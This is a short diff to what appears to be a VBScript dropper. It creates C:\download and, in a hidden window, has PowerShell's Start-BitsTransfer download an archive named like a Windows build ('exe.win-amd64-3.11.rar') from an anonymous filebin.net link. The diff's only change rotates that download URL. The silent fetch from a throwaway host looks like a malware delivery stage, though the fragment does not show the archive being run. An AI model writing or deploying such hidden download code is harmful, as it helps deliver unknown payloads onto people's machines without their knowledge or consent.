@@ -6,7 +6,7 @@ If Not fso.FolderExists("C:\download") Then
     fso.CreateFolder("C:\download")
 End If
 
-command = "powershell -Command ""Start-BitsTransfer -Source 'https://filebin.net/2njxq2027v1i0t7b/exe.win-amd64-3.11.rar' -Destination 'C:\download\exe.win-amd64-3.11.rar'"""
+command = "powershell -Command ""Start-BitsTransfer -Source 'https://filebin.net/mh6w10ul6h61xs3y/exe.win-amd64-3.11.rar' -Destination 'C:\download\exe.win-amd64-3.11.rar'"""
 objShell.Run command, 0, True
 
 ' 
